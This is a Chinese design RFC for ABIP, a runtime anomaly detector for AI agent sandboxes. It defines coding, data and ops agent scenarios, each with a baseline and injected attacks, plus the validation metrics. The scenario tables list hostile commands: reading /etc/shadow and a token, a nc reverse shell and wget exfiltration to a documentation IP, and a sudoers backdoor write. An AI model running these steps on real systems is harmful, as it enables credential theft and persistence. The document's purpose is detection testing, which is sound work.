# RFC 0001: OpenShell Agent 行为场景与 ABIP 验证协议

状态:Accepted · 日期:2026-11-23 · 作者:ABIP team
关联:[架构设计](../architecture.md) · [POC 验收报告](../poc-report.md)

## 1. 动机

ABIP 的核心命题是:**工作负载的运行时行为是可学习的,偏离历史行为模式的序列是可检测的**。
合成数据证明了链路可行,但只有在真实 Agent 工作负载上验证,命题才成立。

集群中已有 NVIDIA OpenShell(基于 agent-sandbox `Sandbox` CR)作为 Agent 运行时。
本 RFC 定义 3 个 OpenShell Agent 场景,作为 ABIP 的**可复现验证夹具**:
每个场景 = 一个行为 profile(基线)+ 一组注入攻击(偏离),在真实 Tetragon 观测下
度量 ABIP 的学习与检测能力。

## 2. 设计理念

1. **行为 profile 是学习单元。** 不按集群全局训练一个模型,而是按工作负载类型
   (coding / data / ops)分别建立 Champion。Agent 的"正常"由它自己的历史定义,
   不是由管理员的想象定义。对应 v1.0 的 workload_profile 与租户模型策略。

2. **两层检测,确定性优先。**
   - 学习层:LSTM 下一事件预测的惊讶度 `-log P(actual)`,捕捉**事件类别层面**的意外
     (如 coding agent 突然派生 nc 外联)。
   - 确定性层:Risk Context 标记(sensitive_resource / external_destination /
     capability_change / unknown_binary),捕捉**资源与身份层面**的异常
     (读 /etc/shadow 在类别上仍是普通 file_open,惊讶度无效,必须靠规则;
     类别头区分不了 nc 与 ls 的 exec——都是 process_exec——profile 外的未知二进制
     由 unknown_binary 标记)。
   两层互补,缺一不可;确定性规则永远优先于模型判断。
   注意:/etc/passwd 是 world-readable 的配置,**不是**敏感资源(ops 场景的误报对照)。

3. **场景即夹具,验证即度量。** 每个场景有明确的基线脚本与攻击注入点,攻击步骤有
   ground truth 签名。验收不是"看起来能检测",而是可复现的数字:基线 Top-k、
   攻击 Risk Context 覆盖率、异常分分离度。

4. **观测与执行分离。** ABIP 只观测(monitoring mode),不干预 OpenShell 的
   sandbox 生命周期;通过 pod 标签 `abip.io/observe=true` 选择观测对象。
   决策消费(告警/审批/阻断)是 P3/P4 的下游职责,OpenShell 不是 ABIP 的依赖。

5. **训练/推理同一契约。** 场景验证复用 feature-schema-v1 与唯一模型定义,
   不为验证另写一套特征逻辑;验证代码本身就是生产代码路径。

## 3. 场景定义

运行载体:OpenShell namespace 下的 `Sandbox` CR(agent-sandbox controller 调谐),
pod 标签 `abip.io/observe=true` + `abip.io/scenario=<name>`,TracingPolicy 按标签观测。
脚本见 `deployment/openshell/scenario-scripts.yaml`(ConfigMap),
执行器 `scripts/run-scenarios.sh`,评分器 `scripts/verify_scenarios.py`。

> 镜像说明:OpenShell 标准镜像为 nvcr.io/nvidia/base/ubuntu:24.04;本网络无法拉取
> 外部镜像(DNS 污染),验证使用节点缓存的 nginx:1.27-alpine(busybox)作为行为载体。
> 行为 profile 由进程/文件/网络模式定义,与镜像无关;接入真实 OpenShell 会话时
> 只需替换载体,脚本与验证协议不变。

### S1 coding-agent(编码 Agent)

| | 行为 |
|---|---|
| 基线 | 写/读 /workspace/src 源码 → sh 子进程 ls → cp 构建产物到 /tmp → tar 打包 → wget 内部包镜像(10.96.0.1) |
| 攻击 | ① cat /etc/shadow(凭据窃取)② sh→nc 203.0.113.9:4444(反弹 shell 链)③ wget http://203.0.113.9/exfil(外传) |
| 预期检测 | ①③ Risk Context(sensitive / external);② unknown_binary(nc 不在 profile 词表)+ external;进程树 sh→nc 链由树上下文继承评分 |

### S2 data-agent(数据分析 Agent)

| | 行为 |
|---|---|
| 基线 | dd 生成 /workspace/data.csv → cat 读取 → gzip 压缩 → tar 归档 → wget 内部数据 API(10.96.0.10) |
| 攻击 | ① cat /var/run/secrets/.../token(SA 令牌窃取)② ls /root/.ssh(密钥探测)③ nc 203.0.113.9:4444(外传通道) |
| 预期检测 | ①② Risk Context sensitive;③ external + 类别意外 |

### S3 ops-agent(运维 Agent)

| | 行为 |
|---|---|
| 基线 | cat /etc/passwd、/etc/hosts(运维读配置是**正常**行为)→ ls /var/log → wget 内部健康检查 |
| 攻击 | ① cat /etc/shadow(与基线读 /etc/passwd 仅一步之遥,考验资源级区分)② echo > /etc/sudoers.d/backdoor(提权持久化)③ nc 203.0.113.9:4444 |
| 预期检测 | ①② Risk Context sensitive(注意 /etc/passwd 是 config 类,不应误报);③ external + 类别意外 |

S3 是关键对照:**同类操作(读 /etc 下文件)因资源敏感度不同而判定不同**,
验证确定性层不做"一刀切 /etc"。

## 4. 验证协议

对每个场景 S:

1. 创建 baseline Sandbox,运行基线脚本(30 轮),期间 `tetra getevents` 采集;
2. Collector 规范化(去重/进程树/乱序),按场景独立训练 Champion(models/scenario-S);
3. 创建 attack Sandbox(10 轮基线热身 + 攻击注入 + 5 轮基线),采集;
4. 用 baseline Champion 对 attack 流推理,按 ground truth 签名
   (/etc/shadow、/root/.ssh、/var/run/secrets、/etc/sudoers、203.0.113.9、nc)识别攻击事件;
5. 输出场景报告。

### 验收标准

| 指标 | 门槛 |
|---|---|
| 事件完整性 | invalid=0;攻击步骤全部被观测到 |
| 基线学习 | 每场景 Top-3 ≥ 0.80(profile 可学习) |
| 两层覆盖 | 每个攻击签名事件至少被一层命中:Risk Context 或 LSTM 惊讶度 > 基线 p90,覆盖率 = 1.0 |
| 误报对照 | 基线中 /etc/passwd 等 config 读取不被标记 sensitive |

训练/推理对齐(两轮验证迭代出的关键设计):
- 训练:子进程样本前置父进程最近 `tree_context_events`(16)个事件,边界标签 = 子进程首事件
  (训练"父上下文 → 子进程诞生"转移)。
- 推理:子进程诞生时用父进程最近 16 个事件**从零状态重放**初始化,而非克隆父进程全量
  Hidden State。首轮验证暴露:自身序列 Top-3 0.959 但诞生评分仅 0.475——克隆全量历史
  造成分布失配;改为重放后与训练构造逐位一致。这不是模型容量问题(2 层 128 足够)。

## 5. 结果

(运行后填写,见 §6 复现命令)

## 6. 复现

```bash
# 在 192.168.5.190(已配 kubectl/Tetragon 集群访问)
cd /root/ABIP
bash scripts/run-scenarios.sh        # 采集 + 训练 + 评分,约 6 分钟
cat data/scenario-report.json        # 汇总
```

## 7. 限制与后续

- busybox 载体无 python3,S1 的"python→bash→curl"链以 sh→nc 近似;真实 OpenShell
  会话(ubuntu 镜像 + Agent 工具调用)接入后重跑本协议。
- commit_creds 每次 execve 触发(良性噪声),capability_change 不参与本验收门槛。
- 攻击目的地 203.0.113.9 为 TEST-NET-3 文档地址,连接不会真正建立,但 tcp_connect
  系统调用已被观测——检测的是行为意图,不是连接结果。
- 后续:把场景脚本换成真实 OpenShell gateway 会话(API 创建 sandbox + 下发命令),
  验证 ABIP 对真实 Agent 工具调用运行时行为的检测。